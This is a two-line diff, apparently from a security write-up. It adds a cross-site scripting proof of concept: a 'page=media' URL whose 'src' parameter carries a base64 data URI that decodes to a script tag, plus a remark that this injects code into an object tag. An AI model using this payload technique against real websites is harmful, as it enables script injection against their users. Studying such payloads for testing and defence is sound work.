@@ -1,0 +1,2 @@
+/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpMTMzNzwvc2NyaXB0Pg==
+this will inject directly a malicious code inside object tag.
